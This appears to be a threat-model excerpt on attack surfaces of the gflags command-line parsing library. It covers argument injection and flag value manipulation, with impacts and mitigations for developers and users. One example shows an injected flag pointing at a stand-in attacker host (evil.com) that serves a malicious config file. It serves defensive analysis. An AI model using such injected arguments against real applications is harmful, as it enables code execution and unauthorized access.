* **Command-Line Argument Injection**
    * **Description:** Attackers inject malicious or unexpected command-line arguments to alter application behavior.
    * **How gflags Contributes:** `gflags` is the mechanism by which the application parses and interprets command-line arguments, making it the entry point for such injections. It defines how flags are recognized and their values are extracted.
    * **Example:** An attacker might provide `--config_file=https://evil.com/malicious.conf` if the application uses a `--config_file` flag and doesn't properly validate the URL.
    * **Impact:**  Can lead to arbitrary code execution, data breaches, denial of service, or unauthorized access depending on how the injected arguments are processed by the application.
    * **Risk Severity:** High to Critical (depending on the application's handling of flag values).
    * **Mitigation Strategies:**
        * **Developers:** Implement strict input validation on all flag values *after* parsing by `gflags`. Sanitize inputs before using them in system calls or sensitive operations. Avoid directly using flag values in shell commands without proper escaping.
        * **Users:** Be cautious about running applications with command-line arguments from untrusted sources.

* **Flag Value Manipulation**
    * **Description:** Attackers provide crafted or excessively long values for existing flags to exploit vulnerabilities in the application's handling of these values.
    * **How gflags Contributes:** `gflags` parses the provided values and makes them available to the application. If the application doesn't handle these values securely, it can be exploited.
    * **Example:** Providing an extremely long string for a flag that is used to allocate a buffer, potentially leading to a buffer overflow in the application's code.
    * **Impact:** Can lead to buffer overflows, memory corruption, denial of service, or unexpected application behavior.
    * **Risk Severity:** High to Critical (depending on the vulnerability in the application's value handling).
    * **Mitigation Strategies:**
        * **Developers:** Implement bounds checking and size limitations when processing flag values. Use safe string handling functions. Avoid assumptions about the length or format of flag values.
        * **Users:** Be aware that providing unusually long or strange values for command-line flags might trigger unexpected behavior.
